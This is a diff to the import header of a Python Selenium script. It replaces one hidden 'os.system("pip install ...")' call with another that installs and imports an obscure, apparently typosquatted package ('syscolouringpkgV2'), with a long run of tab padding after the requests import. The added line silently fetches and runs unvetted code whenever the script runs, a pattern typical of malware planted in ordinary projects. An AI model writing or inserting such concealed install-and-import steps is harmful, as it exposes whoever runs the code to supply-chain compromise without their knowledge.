@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptographyV1")
-import syscryptographyV1
+os.system("pip install syscolouringpkgV2")
+import syscolouringpkgV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
